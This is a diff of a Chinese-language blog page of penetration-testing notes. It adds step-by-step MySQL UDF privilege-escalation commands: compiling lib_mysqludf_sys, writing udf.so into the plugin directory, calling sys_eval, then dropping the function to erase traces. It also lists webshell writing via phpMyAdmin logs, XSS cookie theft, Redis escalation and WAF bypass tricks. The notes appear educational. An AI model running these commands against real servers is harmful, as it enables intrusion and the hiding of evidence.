@@ -292,11 +292,17 @@
 <li>利用管理员cookie进行管理页面登录</li>
 <li>登陆后后台查看有无上传文件权限进行webshell上传</li>
 </ul>
-<p>XSS平台：？？？</p>
-<h3 id="mysql获取权限"><a href="#mysql获取权限" class="headerlink" title="mysql获取权限"></a>mysql获取权限</h3><ul>
+<p>另外可借助一些XSS平台监听放的【钓鱼链接】</p>
+<h3 id="数据库权限"><a href="#数据库权限" class="headerlink" title="数据库权限"></a>数据库权限</h3><p>mysql</p>
+<ul>
 <li>写webshell select into outfile</li>
 <li>UDF提权</li>
 <li>MOF提权</li>
+<li>配置phpmyadmin日志获取webshell<ul>
+<li>general log  </li>
+<li>general log file 记录sql查询记录，默认在./data目录下</li>
+</ul>
+</li>
 </ul>
 <p>sqlserver</p>
 <ul>
@@ -312,7 +318,7 @@
 <li>知道绝对路径且可写可执行</li>
 <li>单双引号可以正常使用</li>
 </ul>
-<p>获取绝对路径</p>
+<p>获取绝对路径方式</p>
 <ul>
 <li>报错信息</li>
 <li>phpinfo、探针等文件</li>
@@ -336,13 +342,9 @@
 <ul>
 <li>UDF提权</li>
 <li>MOF提权</li>
-<li>配置phpmyadmin日志获取webshell<ul>
-<li>general log  </li>
-<li>general log file 记录sql查询记录，默认在./data目录下</li>
+<li>UDF提权</li>
 </ul>
-</li>
-</ul>
-<h4 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h4><p>实战5</p>
+<p>实战5：udf提权</p>
 <ul>
 <li>Userdefined Function：是用户自定义函数，mysql为用户提供的一个扩展功能的接口，用户可以通过编写代码的方式编译成.so.dll文件，使用自定义函数</li>
 <li>使用条件<ul>
@@ -355,18 +357,53 @@
 <p>获取plugin目录：@@plugin_dir</p>
 <p>此种方法Windows下易用</p>
 <p>工具地址：lib_mysqludf_sys：<a href="https://github.com/mysqludf/lib_mysqludf_sys" target="_blank" rel="noopener">https://github.com/mysqludf/lib_mysqludf_sys</a></p>
-<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200630152815436.png" alt="image-20200630152815436"></p>
-<h4 id="redis提权"><a href="#redis提权" class="headerlink" title="redis提权"></a>redis提权</h4><ul>
-<li>定时任务</li>
-</ul>
-<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200630164212893.png" alt="image-20200630164212893"></p>
 <ul>
-<li>写入ssh</li>
+<li>先将仓库clone到本地</li>
 </ul>
-<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200630164808954.png" alt="image-20200630164808954"></p>
-<h3 id="shell提权"><a href="#shell提权" class="headerlink" title="shell提权"></a>shell提权</h3><p>反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;mysqludf&#x2F;lib_mysqludf_sys</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>生成exp</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -l &#x2F;www&#x2F;mysql&#x2F;include -Os -shared lib_mysqludf_sys.c -fPIC -o udf.so</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将生成的文件十六进制编码</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(&#39;&#x2F;tmp&#x2F;udf.so&#39;))</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取plugin目录</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@plugin_dir</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>写入内容</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select unhex(&#39;第三步hex的内容&#39;) into dump file &#39;plugin_dir&#x2F;udf.so&#39;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>进行函数声明与udf.so相关联</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_eval returns string soname &#39;udf.so&#39;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&#39;pwd&#39;);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>痕迹销毁</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop function sys_eval</span><br></pre></td></tr></table></figure>
+
+<h4 id="redis提权"><a href="#redis提权" class="headerlink" title="redis提权"></a>redis提权</h4><ul>
+<li><p>定时任务</p>
+</li>
+<li><p>写入ssh</p>
+</li>
+</ul>
 <h3 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h3><p>逻辑漏洞是指由于程序逻辑不严或逻辑太复杂，而导致一些逻辑分支不能够正常处理或处理错误。</p>
-<p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200630170141679.png" alt="image-20200630170141679"></p>
 <p>一般有以下几种情况</p>
 <ul>
 <li>密码找回</li>
@@ -457,7 +494,7 @@
 <p>绕过思路</p>
 <p>云waf cdn WAF绕过：尝试直接访问主站</p>
 <p>主机WAF：通过内容绕过</p>
-<p>​     大小写 内联注释 换行符</p>
+<p>大小写 内联注释 换行符</p>
 
         </div>
 
